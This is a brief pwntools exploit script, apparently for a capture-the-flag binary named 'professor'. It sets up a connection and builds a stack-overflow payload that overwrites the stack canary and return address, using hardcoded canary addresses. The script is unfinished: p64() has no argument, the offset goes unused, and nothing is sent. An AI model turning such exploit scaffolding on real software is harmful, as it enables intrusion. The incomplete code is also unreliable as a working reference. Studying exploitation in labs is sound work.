#!/usr/bin/env python3

from pwn import *

exe = ELF("./professor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    buf_addr = 0x7ffff8dadec0
    master_canary_addr = 0x7ffff7dae728
    master_canary_addr_off = buf_addr - master_canary_addr


    payload = flat(
        b'A' * 40,  # offset to canary
        b'B' * 8,   # canary
        b'A' * 8,   # rbp
        p64(),      # ret
    ) 

    r.interactive()


if __name__ == "__main__":
    main()
